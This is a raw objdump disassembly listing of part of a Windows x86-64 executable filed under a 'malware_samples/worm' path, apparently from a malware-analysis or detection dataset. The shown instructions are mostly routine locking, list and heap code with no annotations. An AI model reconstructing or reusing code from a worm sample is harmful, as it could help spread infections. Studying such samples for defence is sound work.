
malware_samples/worm/85d978cdbda32a964857f44ac1ec589ce2c54c1e3cd12a1ac366d388efb16a66.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	cc                   	int3
   180001001:	cc                   	int3
   180001002:	cc                   	int3
   180001003:	cc                   	int3
   180001004:	cc                   	int3
   180001005:	cc                   	int3
   180001006:	cc                   	int3
   180001007:	cc                   	int3
   180001008:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000100d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180001012:	57                   	push   %rdi
   180001013:	48 83 ec 20          	sub    $0x20,%rsp
   180001017:	48 8b f1             	mov    %rcx,%rsi
   18000101a:	48 8b fa             	mov    %rdx,%rdi
   18000101d:	48 8d 0d 7c 0d 04 00 	lea    0x40d7c(%rip),%rcx        # 0x180041da0
   180001024:	48 ff 15 1d 9e 03 00 	rex.W call *0x39e1d(%rip)        # 0x18003ae48
   18000102b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001030:	48 8b 15 69 0f 04 00 	mov    0x40f69(%rip),%rdx        # 0x180041fa0
   180001037:	33 db                	xor    %ebx,%ebx
   180001039:	48 85 d2             	test   %rdx,%rdx
   18000103c:	74 27                	je     0x180001065
   18000103e:	4c 8b c7             	mov    %rdi,%r8
   180001041:	48 8b ce             	mov    %rsi,%rcx
   180001044:	48 ff 15 5d 9a 03 00 	rex.W call *0x39a5d(%rip)        # 0x18003aaa8
   18000104b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001050:	83 f8 01             	cmp    $0x1,%eax
   180001053:	74 15                	je     0x18000106a
   180001055:	48 ff 15 f4 98 03 00 	rex.W call *0x398f4(%rip)        # 0x18003a950
   18000105c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001061:	8b d8                	mov    %eax,%ebx
   180001063:	eb 05                	jmp    0x18000106a
   180001065:	bb 15 00 00 00       	mov    $0x15,%ebx
   18000106a:	48 8d 0d 2f 0d 04 00 	lea    0x40d2f(%rip),%rcx        # 0x180041da0
   180001071:	48 ff 15 b0 9d 03 00 	rex.W call *0x39db0(%rip)        # 0x18003ae28
   180001078:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000107d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180001082:	8b c3                	mov    %ebx,%eax
   180001084:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001089:	48 83 c4 20          	add    $0x20,%rsp
   18000108d:	5f                   	pop    %rdi
   18000108e:	c3                   	ret
   18000108f:	cc                   	int3
   180001090:	cc                   	int3
   180001091:	cc                   	int3
   180001092:	cc                   	int3
   180001093:	cc                   	int3
   180001094:	cc                   	int3
   180001095:	cc                   	int3
   180001096:	cc                   	int3
   180001097:	cc                   	int3
   180001098:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000109d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800010a2:	57                   	push   %rdi
   1800010a3:	48 83 ec 20          	sub    $0x20,%rsp
   1800010a7:	48 8b f1             	mov    %rcx,%rsi
   1800010aa:	33 ff                	xor    %edi,%edi
   1800010ac:	48 8b 0d ad f7 03 00 	mov    0x3f7ad(%rip),%rcx        # 0x180040860
   1800010b3:	33 d2                	xor    %edx,%edx
   1800010b5:	44 8d 47 20          	lea    0x20(%rdi),%r8d
   1800010b9:	48 ff 15 e8 98 03 00 	rex.W call *0x398e8(%rip)        # 0x18003a9a8
   1800010c0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800010c5:	48 8b d8             	mov    %rax,%rbx
   1800010c8:	48 85 c0             	test   %rax,%rax
   1800010cb:	75 08                	jne    0x1800010d5
   1800010cd:	8d 78 08             	lea    0x8(%rax),%edi
   1800010d0:	e9 87 00 00 00       	jmp    0x18000115c
   1800010d5:	48 21 78 18          	and    %rdi,0x18(%rax)
   1800010d9:	48 8d 0d c0 0c 04 00 	lea    0x40cc0(%rip),%rcx        # 0x180041da0
   1800010e0:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1800010e4:	48 ff 15 5d 9d 03 00 	rex.W call *0x39d5d(%rip)        # 0x18003ae48
   1800010eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800010f0:	48 39 3d a9 0e 04 00 	cmp    %rdi,0x40ea9(%rip)        # 0x180041fa0
   1800010f7:	75 07                	jne    0x180001100
   1800010f9:	bf 15 00 00 00       	mov    $0x15,%edi
   1800010fe:	eb 2d                	jmp    0x18000112d
   180001100:	48 8b 05 c9 0e 04 00 	mov    0x40ec9(%rip),%rax        # 0x180041fd0
   180001107:	48 8d 0d c2 0e 04 00 	lea    0x40ec2(%rip),%rcx        # 0x180041fd0
   18000110e:	48 39 48 08          	cmp    %rcx,0x8(%rax)
   180001112:	74 07                	je     0x18000111b
   180001114:	b9 03 00 00 00       	mov    $0x3,%ecx
   180001119:	cd 29                	int    $0x29
   18000111b:	48 89 03             	mov    %rax,(%rbx)
   18000111e:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   180001122:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180001126:	48 89 1d a3 0e 04 00 	mov    %rbx,0x40ea3(%rip)        # 0x180041fd0
   18000112d:	48 8d 0d 6c 0c 04 00 	lea    0x40c6c(%rip),%rcx        # 0x180041da0
   180001134:	48 ff 15 ed 9c 03 00 	rex.W call *0x39ced(%rip)        # 0x18003ae28
   18000113b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001140:	85 ff                	test   %edi,%edi
   180001142:	74 18                	je     0x18000115c
   180001144:	48 8b 0d 15 f7 03 00 	mov    0x3f715(%rip),%rcx        # 0x180040860
   18000114b:	4c 8b c3             	mov    %rbx,%r8
   18000114e:	33 d2                	xor    %edx,%edx
   180001150:	48 ff 15 49 98 03 00 	rex.W call *0x39849(%rip)        # 0x18003a9a0
   180001157:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000115c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001161:	8b c7                	mov    %edi,%eax
   180001163:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180001168:	48 83 c4 20          	add    $0x20,%rsp
   18000116c:	5f                   	pop    %rdi
   18000116d:	c3                   	ret
   18000116e:	cc                   	int3
   18000116f:	cc                   	int3
   180001170:	cc                   	int3
   180001171:	cc                   	int3
   180001172:	cc                   	int3
   180001173:	cc                   	int3
   180001174:	cc                   	int3
   180001175:	cc                   	int3
   180001176:	cc                   	int3
   180001177:	cc                   	int3
   180001178:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000117d:	57                   	push   %rdi
   18000117e:	48 83 ec 20          	sub    $0x20,%rsp
   180001182:	48 8b 0d d7 f6 03 00 	mov    0x3f6d7(%rip),%rcx        # 0x180040860
   180001189:	33 ff                	xor    %edi,%edi
   18000118b:	33 d2                	xor    %edx,%edx
   18000118d:	44 8d 47 20          	lea    0x20(%rdi),%r8d
   180001191:	48 ff 15 10 98 03 00 	rex.W call *0x39810(%rip)        # 0x18003a9a8
   180001198:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000119d:	48 8b d8             	mov    %rax,%rbx
   1800011a0:	48 85 c0             	test   %rax,%rax
   1800011a3:	75 08                	jne    0x1800011ad
   1800011a5:	8d 78 08             	lea    0x8(%rax),%edi
   1800011a8:	e9 8e 00 00 00       	jmp    0x18000123b
   1800011ad:	48 21 7b 18          	and    %rdi,0x18(%rbx)
   1800011b1:	48 8d 05 98 dc 02 00 	lea    0x2dc98(%rip),%rax        # 0x18002ee50
   1800011b8:	48 8d 0d e1 0b 04 00 	lea    0x40be1(%rip),%rcx        # 0x180041da0
   1800011bf:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1800011c3:	48 ff 15 7e 9c 03 00 	rex.W call *0x39c7e(%rip)        # 0x18003ae48
   1800011ca:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800011cf:	48 39 3d ca 0d 04 00 	cmp    %rdi,0x40dca(%rip)        # 0x180041fa0
   1800011d6:	75 07                	jne    0x1800011df
   1800011d8:	bf 15 00 00 00       	mov    $0x15,%edi
   1800011dd:	eb 2d                	jmp    0x18000120c
   1800011df:	48 8b 05 fa 0d 04 00 	mov    0x40dfa(%rip),%rax        # 0x180041fe0
   1800011e6:	48 8d 0d f3 0d 04 00 	lea    0x40df3(%rip),%rcx        # 0x180041fe0
   1800011ed:	48 39 48 08          	cmp    %rcx,0x8(%rax)
   1800011f1:	74 07                	je     0x1800011fa
   1800011f3:	b9 03 00 00 00       	mov    $0x3,%ecx
   1800011f8:	cd 29                	int    $0x29
   1800011fa:	48 89 03             	mov    %rax,(%rbx)
   1800011fd:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   180001201:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180001205:	48 89 1d d4 0d 04 00 	mov    %rbx,0x40dd4(%rip)        # 0x180041fe0
   18000120c:	48 8d 0d 8d 0b 04 00 	lea    0x40b8d(%rip),%rcx        # 0x180041da0
   180001213:	48 ff 15 0e 9c 03 00 	rex.W call *0x39c0e(%rip)        # 0x18003ae28
   18000121a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000121f:	85 ff                	test   %edi,%edi
   180001221:	74 18                	je     0x18000123b
   180001223:	48 8b 0d 36 f6 03 00 	mov    0x3f636(%rip),%rcx        # 0x180040860
   18000122a:	4c 8b c3             	mov    %rbx,%r8
   18000122d:	33 d2                	xor    %edx,%edx
   18000122f:	48 ff 15 6a 97 03 00 	rex.W call *0x3976a(%rip)        # 0x18003a9a0
   180001236:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000123b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001240:	8b c7                	mov    %edi,%eax
   180001242:	48 83 c4 20          	add    $0x20,%rsp
   180001246:	5f                   	pop    %rdi
   180001247:	c3                   	ret
   180001248:	cc                   	int3
   180001249:	cc                   	int3
   18000124a:	cc                   	int3
   18000124b:	cc                   	int3
   18000124c:	cc                   	int3
   18000124d:	cc                   	int3
   18000124e:	cc                   	int3
   18000124f:	cc                   	int3
   180001250:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001255:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000125a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000125f:	41 56                	push   %r14
   180001261:	48 83 ec 30          	sub    $0x30,%rsp
   180001265:	4c 8d 35 34 0b 04 00 	lea    0x40b34(%rip),%r14        # 0x180041da0
   18000126c:	33 ff                	xor    %edi,%edi
   18000126e:	49 8b ce             	mov    %r14,%rcx
   180001271:	33 f6                	xor    %esi,%esi
   180001273:	48 ff 15 ce 9b 03 00 	rex.W call *0x39bce(%rip)        # 0x18003ae48
   18000127a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000127f:	f0 09 34 24          	lock or %esi,(%rsp)
   180001283:	8b 05 77 0b 04 00    	mov    0x40b77(%rip),%eax        # 0x180041e00
   180001289:	85 c0                	test   %eax,%eax
   18000128b:	74 14                	je     0x1800012a1
   18000128d:	49 8b ce             	mov    %r14,%rcx
   180001290:	48 ff 15 91 9b 03 00 	rex.W call *0x39b91(%rip)        # 0x18003ae28
   180001297:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000129c:	e9 1a 01 00 00       	jmp    0x1800013bb
   1800012a1:	48 8b 05 28 0d 04 00 	mov    0x40d28(%rip),%rax        # 0x180041fd0
   1800012a8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800012ad:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800012b2:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1800012b6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800012bb:	48 8b 05 16 0d 04 00 	mov    0x40d16(%rip),%rax        # 0x180041fd8
   1800012c2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800012c7:	48 89 08             	mov    %rcx,(%rax)
   1800012ca:	48 8d 05 ff 0c 04 00 	lea    0x40cff(%rip),%rax        # 0x180041fd0
   1800012d1:	ff 05 e1 0c 04 00    	incl   0x40ce1(%rip)        # 0x180041fb8
   1800012d7:	49 8b ce             	mov    %r14,%rcx
   1800012da:	48 89 05 f7 0c 04 00 	mov    %rax,0x40cf7(%rip)        # 0x180041fd8
   1800012e1:	48 89 05 e8 0c 04 00 	mov    %rax,0x40ce8(%rip)        # 0x180041fd0
   1800012e8:	48 ff 15 39 9b 03 00 	rex.W call *0x39b39(%rip)        # 0x18003ae28
   1800012ef:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800012f4:	eb 50                	jmp    0x180001346
   1800012f6:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   1800012fb:	48 39 43 08          	cmp    %rax,0x8(%rbx)
   1800012ff:	0f 85 cd 00 00 00    	jne    0x1800013d2
   180001305:	48 8b 03             	mov    (%rbx),%rax
   180001308:	48 39 58 08          	cmp    %rbx,0x8(%rax)
   18000130c:	0f 85 c0 00 00 00    	jne    0x1800013d2
   180001312:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001317:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000131c:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180001320:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   180001324:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180001328:	ff 15 6a 9b 03 00    	call   *0x39b6a(%rip)        # 0x18003ae98
   18000132e:	48 8b 0d 2b f5 03 00 	mov    0x3f52b(%rip),%rcx        # 0x180040860
   180001335:	4c 8b c3             	mov    %rbx,%r8
   180001338:	33 d2                	xor    %edx,%edx
   18000133a:	48 ff 15 5f 96 03 00 	rex.W call *0x3965f(%rip)        # 0x18003a9a0
   180001341:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001346:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   18000134b:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   180001350:	48 3b d8             	cmp    %rax,%rbx
   180001353:	75 a1                	jne    0x1800012f6
   180001355:	49 8b ce             	mov    %r14,%rcx
   180001358:	48 ff 15 e9 9a 03 00 	rex.W call *0x39ae9(%rip)        # 0x18003ae48
   18000135f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001364:	83 05 4d 0c 04 00 ff 	addl   $0xffffffff,0x40c4d(%rip)        # 0x180041fb8
   18000136b:	75 2e                	jne    0x18000139b
   18000136d:	39 35 49 0c 04 00    	cmp    %esi,0x40c49(%rip)        # 0x180041fbc
   180001373:	75 26                	jne    0x18000139b
   180001375:	48 8b 05 44 0c 04 00 	mov    0x40c44(%rip),%rax        # 0x180041fc0
   18000137c:	48 85 c0             	test   %rax,%rax
   18000137f:	74 1a                	je     0x18000139b
   180001381:	48 83 25 37 0c 04 00 	andq   $0x0,0x40c37(%rip)        # 0x180041fc0
   180001388:	00 
   180001389:	48 8b f8             	mov    %rax,%rdi
   18000138c:	48 8b 35 35 0c 04 00 	mov    0x40c35(%rip),%rsi        # 0x180041fc8
   180001393:	48 83 25 2d 0c 04 00 	andq   $0x0,0x40c2d(%rip)        # 0x180041fc8
   18000139a:	00 
   18000139b:	49 8b ce             	mov    %r14,%rcx
   18000139e:	48 ff 15 83 9a 03 00 	rex.W call *0x39a83(%rip)        # 0x18003ae28
   1800013a5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800013aa:	48 85 ff             	test   %rdi,%rdi
   1800013ad:	74 0c                	je     0x1800013bb
   1800013af:	48 8b ce             	mov    %rsi,%rcx
   1800013b2:	48 8b c7             	mov    %rdi,%rax
   1800013b5:	ff 15 dd 9a 03 00    	call   *0x39add(%rip)        # 0x18003ae98
   1800013bb:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800013c0:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1800013c5:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1800013ca:	48 83 c4 30          	add    $0x30,%rsp
   1800013ce:	41 5e                	pop    %r14
   1800013d0:	c3                   	ret
   1800013d1:	cc                   	int3
   1800013d2:	b9 03 00 00 00       	mov    $0x3,%ecx
   1800013d7:	cd 29                	int    $0x29
   1800013d9:	cc                   	int3
   1800013da:	cc                   	int3
   1800013db:	cc                   	int3
   1800013dc:	cc                   	int3
   1800013dd:	cc                   	int3
   1800013de:	cc                   	int3
   1800013df:	cc                   	int3
   1800013e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800013e5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800013ea:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1800013ef:	41 56                	push   %r14
   1800013f1:	48 83 ec 30          	sub    $0x30,%rsp
   1800013f5:	4c 8d 35 a4 09 04 00 	lea    0x409a4(%rip),%r14        # 0x180041da0
   1800013fc:	33 ff                	xor    %edi,%edi
   1800013fe:	49 8b ce             	mov    %r14,%rcx
   180001401:	33 f6                	xor    %esi,%esi
   180001403:	48 ff 15 3e 9a 03 00 	rex.W call *0x39a3e(%rip)        # 0x18003ae48
   18000140a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000140f:	f0 09 34 24          	lock or %esi,(%rsp)
   180001413:	8b 05 e7 09 04 00    	mov    0x409e7(%rip),%eax        # 0x180041e00
   180001419:	85 c0                	test   %eax,%eax
   18000141b:	74 14                	je     0x180001431
   18000141d:	49 8b ce             	mov    %r14,%rcx
   180001420:	48 ff 15 01 9a 03 00 	rex.W call *0x39a01(%rip)        # 0x18003ae28
   180001427:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000142c:	e9 23 01 00 00       	jmp    0x180001554
   180001431:	48 8b 05 a8 0b 04 00 	mov    0x40ba8(%rip),%rax        # 0x180041fe0
   180001438:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000143d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001442:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180001446:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000144b:	48 8b 05 96 0b 04 00 	mov    0x40b96(%rip),%rax        # 0x180041fe8
   180001452:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180001457:	48 89 08             	mov    %rcx,(%rax)
   18000145a:	48 8d 05 7f 0b 04 00 	lea    0x40b7f(%rip),%rax        # 0x180041fe0
   180001461:	ff 05 55 0b 04 00    	incl   0x40b55(%rip)        # 0x180041fbc
   180001467:	49 8b ce             	mov    %r14,%rcx
   18000146a:	48 89 05 77 0b 04 00 	mov    %rax,0x40b77(%rip)        # 0x180041fe8
   180001471:	48 89 05 68 0b 04 00 	mov    %rax,0x40b68(%rip)        # 0x180041fe0
   180001478:	48 ff 15 a9 99 03 00 	rex.W call *0x399a9(%rip)        # 0x18003ae28
   18000147f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001484:	eb 50                	jmp    0x1800014d6
   180001486:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   18000148b:	48 39 43 08          	cmp    %rax,0x8(%rbx)
   18000148f:	0f 85 d6 00 00 00    	jne    0x18000156b
   180001495:	48 8b 03             	mov    (%rbx),%rax
   180001498:	48 39 58 08          	cmp    %rbx,0x8(%rax)
   18000149c:	0f 85 c9 00 00 00    	jne    0x18000156b
   1800014a2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800014a7:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800014ac:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1800014b0:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   1800014b4:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1800014b8:	ff 15 da 99 03 00    	call   *0x399da(%rip)        # 0x18003ae98
   1800014be:	48 8b 0d 9b f3 03 00 	mov    0x3f39b(%rip),%rcx        # 0x180040860
   1800014c5:	4c 8b c3             	mov    %rbx,%r8
   1800014c8:	33 d2                	xor    %edx,%edx
   1800014ca:	48 ff 15 cf 94 03 00 	rex.W call *0x394cf(%rip)        # 0x18003a9a0
   1800014d1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800014d6:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1800014db:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   1800014e0:	48 3b d8             	cmp    %rax,%rbx
   1800014e3:	75 a1                	jne    0x180001486
   1800014e5:	49 8b ce             	mov    %r14,%rcx
   1800014e8:	48 ff 15 59 99 03 00 	rex.W call *0x39959(%rip)        # 0x18003ae48
   1800014ef:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800014f4:	8b 05 c2 0a 04 00    	mov    0x40ac2(%rip),%eax        # 0x180041fbc
   1800014fa:	ff c8                	dec    %eax
   1800014fc:	39 35 b6 0a 04 00    	cmp    %esi,0x40ab6(%rip)        # 0x180041fb8
   180001502:	89 05 b4 0a 04 00    	mov    %eax,0x40ab4(%rip)        # 0x180041fbc
   180001508:	75 2a                	jne    0x180001534
   18000150a:	85 c0                	test   %eax,%eax
   18000150c:	75 26                	jne    0x180001534
   18000150e:	48 8b 05 ab 0a 04 00 	mov    0x40aab(%rip),%rax        # 0x180041fc0
   180001515:	48 85 c0             	test   %rax,%rax
   180001518:	74 1a                	je     0x180001534
   18000151a:	48 83 25 9e 0a 04 00 	andq   $0x0,0x40a9e(%rip)        # 0x180041fc0
   180001521:	00 
   180001522:	48 8b f8             	mov    %rax,%rdi
   180001525:	48 8b 35 9c 0a 04 00 	mov    0x40a9c(%rip),%rsi        # 0x180041fc8
   18000152c:	48 83 25 94 0a 04 00 	andq   $0x0,0x40a94(%rip)        # 0x180041fc8
   180001533:	00 
   180001534:	49 8b ce             	mov    %r14,%rcx
   180001537:	48 ff 15 ea 98 03 00 	rex.W call *0x398ea(%rip)        # 0x18003ae28
   18000153e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001543:	48 85 ff             	test   %rdi,%rdi
   180001546:	74 0c                	je     0x180001554
   180001548:	48 8b ce             	mov    %rsi,%rcx
   18000154b:	48 8b c7             	mov    %rdi,%rax
   18000154e:	ff 15 44 99 03 00    	call   *0x39944(%rip)        # 0x18003ae98
   180001554:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180001559:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   18000155e:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   180001563:	48 83 c4 30          	add    $0x30,%rsp
   180001567:	41 5e                	pop    %r14
   180001569:	c3                   	ret
   18000156a:	cc                   	int3
   18000156b:	b9 03 00 00 00       	mov    $0x3,%ecx
   180001570:	cd 29                	int    $0x29
   180001572:	cc                   	int3
   180001573:	cc                   	int3
   180001574:	cc                   	int3
   180001575:	cc                   	int3
   180001576:	cc                   	int3
   180001577:	cc                   	int3
   180001578:	cc                   	int3
   180001579:	cc                   	int3
   18000157a:	cc                   	int3
   18000157b:	cc                   	int3
   18000157c:	cc                   	int3
   18000157d:	cc                   	int3
   18000157e:	cc                   	int3
   18000157f:	cc                   	int3
   180001580:	48 83 ec 28          	sub    $0x28,%rsp
   180001584:	8b 0d 56 08 04 00    	mov    0x40856(%rip),%ecx        # 0x180041de0
   18000158a:	48 ff 15 3f 95 03 00 	rex.W call *0x3953f(%rip)        # 0x18003aad0
   180001591:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001596:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   18000159b:	48 85 c0             	test   %rax,%rax
   18000159e:	75 0f                	jne    0x1800015af
   1800015a0:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1800015a5:	e8 42 d8 00 00       	call   0x18000edec
   1800015aa:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1800015af:	c7 40 18 01 00 00 00 	movl   $0x1,0x18(%rax)
   1800015b6:	ba 01 00 00 00       	mov    $0x1,%edx
   1800015bb:	83 c9 ff             	or     $0xffffffff,%ecx
   1800015be:	48 ff 15 13 96 03 00 	rex.W call *0x39613(%rip)        # 0x18003abd8
   1800015c5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800015ca:	eb ea                	jmp    0x1800015b6
   1800015cc:	cc                   	int3
   1800015cd:	cc                   	int3
   1800015ce:	cc                   	int3
   1800015cf:	cc                   	int3
   1800015d0:	cc                   	int3
   1800015d1:	cc                   	int3
   1800015d2:	cc                   	int3
   1800015d3:	cc                   	int3
   1800015d4:	cc                   	int3
   1800015d5:	cc                   	int3
   1800015d6:	cc                   	int3
   1800015d7:	cc                   	int3
   1800015d8:	cc                   	int3
   1800015d9:	cc                   	int3
   1800015da:	cc                   	int3
   1800015db:	cc                   	int3
   1800015dc:	cc                   	int3
   1800015dd:	cc                   	int3
   1800015de:	cc                   	int3
   1800015df:	cc                   	int3
   1800015e0:	48 83 ec 28          	sub    $0x28,%rsp
   1800015e4:	48 8b 0d 6d f2 03 00 	mov    0x3f26d(%rip),%rcx        # 0x180040858
   1800015eb:	33 d2                	xor    %edx,%edx
   1800015ed:	48 ff 15 4c 94 03 00 	rex.W call *0x3944c(%rip)        # 0x18003aa40
   1800015f4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800015f9:	cc                   	int3
   1800015fa:	cc                   	int3
   1800015fb:	cc                   	int3
   1800015fc:	cc                   	int3
   1800015fd:	cc                   	int3
   1800015fe:	cc                   	int3
   1800015ff:	cc                   	int3
   180001600:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001605:	55                   	push   %rbp
   180001606:	48 8b ec             	mov    %rsp,%rbp
   180001609:	48 83 ec 40          	sub    $0x40,%rsp
   18000160d:	48 8d 0d 8c 07 04 00 	lea    0x4078c(%rip),%rcx        # 0x180041da0
   180001614:	33 db                	xor    %ebx,%ebx
   180001616:	48 ff 15 2b 98 03 00 	rex.W call *0x3982b(%rip)        # 0x18003ae48
   18000161d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001622:	48 8b 05 77 09 04 00 	mov    0x40977(%rip),%rax        # 0x180041fa0
   180001629:	48 85 c0             	test   %rax,%rax
   18000162c:	74 0b                	je     0x180001639
   18000162e:	48 83 25 6a 09 04 00 	andq   $0x0,0x4096a(%rip)        # 0x180041fa0
   180001635:	00 
   180001636:	48 8b d8             	mov    %rax,%rbx
   180001639:	48 8d 0d 60 07 04 00 	lea    0x40760(%rip),%rcx        # 0x180041da0
   180001640:	48 ff 15 e1 97 03 00 	rex.W call *0x397e1(%rip)        # 0x18003ae28
   180001647:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000164c:	48 85 db             	test   %rbx,%rbx
   18000164f:	74 3a                	je     0x18000168b
   180001651:	45 33 c0             	xor    %r8d,%r8d
   180001654:	48 8d 0d 85 ff ff ff 	lea    -0x7b(%rip),%rcx        # 0x1800015e0
   18000165b:	48 8b d3             	mov    %rbx,%rdx
   18000165e:	48 ff 15 43 94 03 00 	rex.W call *0x39443(%rip)        # 0x18003aaa8
   180001665:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000166a:	83 ca ff             	or     $0xffffffff,%edx
   18000166d:	48 8b cb             	mov    %rbx,%rcx
   180001670:	48 ff 15 21 95 03 00 	rex.W call *0x39521(%rip)        # 0x18003ab98
   180001677:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000167c:	48 8b cb             	mov    %rbx,%rcx
   18000167f:	48 ff 15 0a 93 03 00 	rex.W call *0x3930a(%rip)        # 0x18003a990
   180001686:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000168b:	48 8b 0d 16 09 04 00 	mov    0x40916(%rip),%rcx        # 0x180041fa8
   180001692:	48 85 c9             	test   %rcx,%rcx
   180001695:	74 14                	je     0x1800016ab
   180001697:	48 ff 15 62 39 04 00 	rex.W call *0x43962(%rip)        # 0x180045000
   18000169e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800016a3:	48 83 25 fd 08 04 00 	andq   $0x0,0x408fd(%rip)        # 0x180041fa8
   1800016aa:	00 
   1800016ab:	48 8b 0d fe 08 04 00 	mov    0x408fe(%rip),%rcx        # 0x180041fb0
   1800016b2:	48 85 c9             	test   %rcx,%rcx
   1800016b5:	74 14                	je     0x1800016cb
   1800016b7:	48 ff 15 42 39 04 00 	rex.W call *0x43942(%rip)        # 0x180045000
   1800016be:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800016c3:	48 83 25 e5 08 04 00 	andq   $0x0,0x408e5(%rip)        # 0x180041fb0
   1800016ca:	00 
   1800016cb:	48 8d 0d ce 06 04 00 	lea    0x406ce(%rip),%rcx        # 0x180041da0
   1800016d2:	48 ff 15 6f 97 03 00 	rex.W call *0x3976f(%rip)        # 0x18003ae48
   1800016d9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800016de:	48 8b 05 fb 08 04 00 	mov    0x408fb(%rip),%rax        # 0x180041fe0
   1800016e5:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1800016e9:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1800016ed:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1800016f1:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1800016f5:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
